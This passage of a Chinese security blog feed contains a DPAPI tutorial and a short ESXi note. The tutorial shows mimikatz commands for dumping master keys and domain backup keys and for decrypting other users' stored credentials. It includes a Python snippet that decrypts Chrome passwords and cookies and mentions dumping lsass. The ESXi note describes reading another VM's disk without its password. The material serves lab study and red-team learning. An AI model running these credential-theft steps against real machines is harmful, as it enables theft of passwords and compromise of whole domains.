        <content type="html"><![CDATA[<h1 id="DPAPI专题"><a href="#DPAPI专题" class="headerlink" title="DPAPI专题"></a>DPAPI专题</h1><h2 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h2><p>DPAPI（Data Protection API）是一种由 Microsoft 提供的用于在 Windows 操作系统中加密和保护敏感数据的技术。它允许开发者和应用程序在存储、传输和处理敏感数据时，使用强大的加密来保护数据的安全性。DPAPI 可以用于保护密码、凭据、私钥等敏感信息，以及在操作系统中的各种配置和用户数据。</p><h2 id="DPAPI保护的对象"><a href="#DPAPI保护的对象" class="headerlink" title="DPAPI保护的对象"></a>DPAPI保护的对象</h2><ol><li><p><strong>用户凭据和密码：</strong> DPAPI 可以用来保护用户的登录密码、密码哈希值和其他凭据信息。这些数据在用户登录和认证过程中使用，使用 DPAPI 可以确保凭据在存储和传输过程中的安全性。</p></li><li><p><strong>私钥和证书：</strong> 在加密通信和数字签名中，私钥和数字证书是关键的安全要素。DPAPI 可以用来保护这些私钥和证书，以防止它们被未经授权的访问者获取。</p></li><li><p><strong>密钥材料：</strong> 加密密钥是保护敏感数据的关键。DPAPI 可以用来保护这些密钥材料，确保只有授权的用户和进程才能使用这些密钥。</p></li><li><p><strong>应用程序配置：</strong> 一些应用程序可能需要在本地存储一些配置信息，如数据库连接字符串、API 密钥等。DPAPI 可以用来保护这些配置信息，防止敏感数据泄露。</p></li><li><p><strong>个人数据和用户文件：</strong> 个人数据和用户文件，如加密邮件、加密文件夹等，可以使用 DPAPI 进行加密，以确保只有授权的用户才能访问。</p></li><li><p><strong>浏览器和应用程序的 Cookie 数据：</strong> 一些应用程序和浏览器会在本地存储 Cookie 数据，以便在用户会话中保持状态。DPAPI 可以用来保护这些 Cookie 数据，以避免泄露用户信息。</p></li><li><p><strong>操作系统配置：</strong> 操作系统可能会存储一些配置信息，如网络设置、代理设置等。DPAPI 可以用来保护这些配置信息。</p></li><li><p><strong>数据缓存：</strong> 在应用程序中，可能会使用缓存来存储一些临时数据。DPAPI 可以用来保护这些缓存数据。</p></li></ol><h2 id="dpapi的加解密"><a href="#dpapi的加解密" class="headerlink" title="dpapi的加解密"></a>dpapi的加解密</h2><p>DPAPI 包含 2 个函数 - 用于加密 ( <code>CryptProtectData</code>) 和解密 ( <code>CryptUnprotectData</code>) 数据</p><p>加密数据guandayelo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;dpapi::protect /data:&#x27;guandayelo&#x27;&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230902143733.png"></p><p>解密数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;dpapi::blob /in:&quot;c:\users\administrator\desktop\1.bin&quot; /unprotect&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>先将blob的数据加载进一个bin文件<br><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230902143929.png"></p><p>在使用mimikatzk解密<br><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230902144120.png"></p><h2 id="列出凭据保管库"><a href="#列出凭据保管库" class="headerlink" title="列出凭据保管库"></a>列出凭据保管库</h2><h3 id="vaultcmd"><a href="#vaultcmd" class="headerlink" title="vaultcmd"></a>vaultcmd</h3><p>简介：vaultcmd是一个可以操作windows凭据管理器的命令行工具，可以列出windows credentials 、web credentials的凭据（web的仅限ie和edge，像google和firefox有自己的凭据管理系统）</p><p>查看当前有那些保管库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vaultcmd /list</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230830154941.png"></p><p>查看具体保管库的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vaultcmd /listcreds:&quot;web Credentials&quot; /all</span><br><span class="line"></span><br><span class="line">中文的</span><br><span class="line">vaultcmd /listcreds:&quot;web 凭据&quot; /all</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230830153858.png"></p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz牛一点，可以看到web凭据的密码，不过也仅限于ie和edge</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz vault::list</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230830154619.png"></p><h2 id="获取google浏览器cookie和密码"><a href="#获取google浏览器cookie和密码" class="headerlink" title="获取google浏览器cookie和密码"></a>获取google浏览器cookie和密码</h2><p>google cookie文件保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\Google\Chrome\User Data\Default\network\Cookies</span><br><span class="line"></span><br><span class="line">%localappdata% 会映射到当前用户的目录的appdata\local下</span><br></pre></td></tr></table></figure><p>google 登录数据文件保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\Google\Chrome\User Data\Default\Login Data</span><br></pre></td></tr></table></figure><p>寻找出登录的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230830155524.png"></p><p>在chrom 80+以前，是可以直接用mimikatz的&#x2F;unprotect直接利用dpapi的解密函数自动化解密的，但是在80+后，其加密方式有细微改变，即加密后的值的前面会有v10或v11，从local state 中提取出加密的aes后还要经过处理，具体流程如下<br>    1) 从local state文件中提取key;<br>    2) 使用base64解密key<br>    3) 去除key开头的“DPAPI”<br>    4) DPAPI解密，得到最终的key</p><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230901145811.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():  </span><br><span class="line">    jsn = <span class="literal">None</span>  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],  </span><br><span class="line">                           <span class="string">r&quot;Google\Chrome\User Data\Local State&quot;</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>, mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))  </span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):  </span><br><span class="line">    encoded_key = get_key_from_local_state()  </span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())  </span><br><span class="line">    <span class="comment"># remove prefix &#x27;DPAPI&#x27;  </span></span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]  </span><br><span class="line">    key = dpapi_decrypt(encrypted_key)  </span><br><span class="line">    <span class="comment"># get nonce. ignore prefix &#x27;v10&#x27;, length is 12 bytes.  </span></span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]  </span><br><span class="line">    cipher = aesgcm.get_cipher(key)  </span><br><span class="line">    <span class="keyword">return</span> aesgcm.decrypt(cipher, encrypted_txt[<span class="number">15</span>:], nonce)</span><br></pre></td></tr></table></figure><p>拿到aes密钥后获取密码<br><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230901151250.png"></p><p>获取cookie<br><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230901151453.png"></p><h2 id="masterkey-与-maskterkey-加密的凭据文件"><a href="#masterkey-与-maskterkey-加密的凭据文件" class="headerlink" title="masterkey 与 maskterkey 加密的凭据文件"></a>masterkey 与 maskterkey 加密的凭据文件</h2><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey</a><br>主密钥保护的凭据文件（masterkey file）可能的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd执行</span><br><span class="line">dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell执行</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230831005526.png"></p><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230831005621.png"></p><p>使用mimikatz中的dpapi模块获取更多信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\1CA91FBAAE3BB29094108C543F235349&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230831010910.png"></p><p>获取masterkey（这里的GUID和上边的guidMasterKey对应）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;sekurlsa::dpapi&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">masterkey存放的位置</span><br><span class="line">Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\</span><br><span class="line"></span><br><span class="line">Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\&#123;SID&#125;</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\&#123;SID&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230831011140.png"></p><p>利用masterKey解密被保护的凭据文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从凭据文件找guidMasterKey，在利用sekurlsa::dpapi和guidMasterKey寻找出对应的MasterKey，最后再结合凭据文件和masterkey 解密得到相应的数据</span><br><span class="line"></span><br><span class="line">dpapi::cred /in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\867596858F7D1EFBA36B14B9B6943193 /masterkey:86649fcceb583f54c4a5f4850c60a08f2a1f4b7d79fb29ecc8403fcacf06de0c37f0a733b38dd8bd5a2ae84ef514def3d2334c82fac1b1f753600b6535296a52</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230831145734.png"></p><p>十六进制数据 “6d 69 63 72 6f 73 6f 66 74” 对应 microsoft</p><h2 id="DPAPI中的域备份密钥"><a href="#DPAPI中的域备份密钥" class="headerlink" title="DPAPI中的域备份密钥"></a>DPAPI中的域备份密钥</h2><p><strong>简介</strong><br>域备份密钥是dpapi重要的一部分，在用户忘记密码或无法登录时，域管可以使用域备份密钥来解锁用户数据，并且由于其本身的重要性，其值是无法修改的。这也意味着只要我们拿到了域备份密钥，那就相当于拿了把永久钥匙在手，可以获取到用户的加密数据。</p><p>使用域管理员获取DPAP备份密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::backupkeys /system:dc.guan.com /export&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230901162654.png"><br>注：legacy key是用来兼容以前版本的dpapi数据，相当于各版本的主密钥对兼容版本。</p><p>用获取到的域备份密钥解密获得用户guan1的masterkey</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dpapi::masterkey /in:&quot;C:\Users\guan1\AppData\Roaming\Microsoft\Protect\S-1-5-21-3508285758-1297247212-4289168691-1104\b256e1a2-98e6-48ac-99f1-7967e2a4e2b6&quot; /pvk:ntds_capi_0_d25d4034-5fca-4084-b1f0-3e37d9179738.keyx.rsa.pvk</span><br><span class="line"></span><br><span class="line">b256e1a2-98e6-48ac-99f1-7967e2a4e2b6为对应的guidmasterkey</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230901224931.png"><br><img src="/2025/03/27/DPAPI/DPAPI%E4%B8%93%E9%A2%98/Pasted%20image%2020230901224909.png"></p><p>拿到masterkey就可以解密相应加密的凭据了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果只是单纯的用dpapi加解密，在使用mimikatz的dpapi模块时，可以使用参数 &#x2F;unprotect来进行直接解密，但仅限当前登录用户。若想解密其它用户的数据，则可以在提权情况下使用 sekurlsa::dpapi来获取其它用户的主密钥。最后在利用主密钥解密相应文件。<br>（如果知道用户的sid、密码、和主密钥的guid，也可直接生成主密钥，该主密钥和存储中的是一致的）</p><p>google chrom版本在80+前后加密有细微差别，不能直接使用 &#x2F;unprotect解密 cookie或者 login data，但可以使用脚本chrom_cookie.py和chrom_pass.py解密获得相应明文数据。</p><p>域备份密钥相当于所有用户的万能钥匙，可以解密所有域用户经过dpapi加密的数据，简单讲就是全能版的masterkey。而且由于其不可改变性，几乎有种一劳永逸的感觉。但是，前提是要拿下域控，拿下域控能做的事情就多了。</p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><h3 id="windows-凭据管理器密码获取"><a href="#windows-凭据管理器密码获取" class="headerlink" title="windows 凭据管理器密码获取"></a>windows 凭据管理器密码获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查看列表</span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line">凭据保管路径</span><br><span class="line">C:\Users\Administrator\AppData\Local\Microsoft\Credentials</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials</span><br><span class="line"></span><br><span class="line">查看对应masterkey file</span><br><span class="line">mimikatz.exe dpapi::cred /in:凭据路径 </span><br><span class="line"></span><br><span class="line">解密</span><br><span class="line">mimikatz.exe dpapi::cred /in:凭据路径 /masterkey:</span><br></pre></td></tr></table></figure><h3 id="获取masterkey的方法"><a href="#获取masterkey的方法" class="headerlink" title="获取masterkey的方法"></a>获取masterkey的方法</h3><p>1）mimikatz在线获取<br>2）procdump导出lsass再离线获取<br>3）拿sercurity.hiv和system.hiv来解<br>解出来会得到m&#x2F;u的两个key，m是用来解机器系统的（在system32）masterkey file；u是用来解机器用户的masterkey file，一般在同机器masterkey file目录下的user文件夹中（解出的masterkey可直接解密windows凭据管理器内容）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>esxi挂载</title>
      <link href="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/"/>
      <url>/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>将win10-test1的磁盘挂载在win10-test上，实现无密码文件读取</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>test1</p><p><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816140134.png"><br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816140403.png"></p><p>test2<br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816140246.png"><br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816140633.png"></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>（1）先给 test1 虚拟机拍快照，防止 test 挂载其硬盘后文件锁定无法恢复<br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816174935.png"></p><p>（2）编辑 test 设置，添加一块硬盘指定 test1 的<br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816182443.png"><br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816182318.png"></p><p>（3）挂载成功<br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816182747.png"></p><p>也可以直接临时复制 test1 的硬盘，然后挂载，这样就不会影响到 test1 也不用快照。<br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816183718.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>挂载后 test1 启动会存在问题<br><img src="/2024/06/17/esxi%E6%8C%82%E8%BD%BD/esxi%E6%8C%82%E8%BD%BD/Pasted%20image%2020240816182954.png"></p><p>重新还原快照就行</p>]]></content>
      
      
      
    </entry>
    
    
  
  
